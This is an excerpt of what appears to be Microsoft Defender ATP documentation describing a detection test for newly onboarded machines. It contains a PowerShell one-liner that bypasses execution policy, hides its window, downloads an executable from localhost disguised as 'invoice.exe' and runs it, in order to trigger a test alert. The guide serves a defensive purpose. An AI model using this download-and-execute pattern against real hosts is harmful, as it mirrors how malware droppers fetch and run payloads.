Run the following PowerShell script on a newly onboarded machine to verify that it is properly reporting to the Microsoft Defender ATP service.

2. Open an elevated command-line prompt on the machine and run the script:

3. At the prompt, copy and run the following command:

    ```
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
    ```

The Command Prompt window will close automatically. If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded machine in approximately 10 minutes.
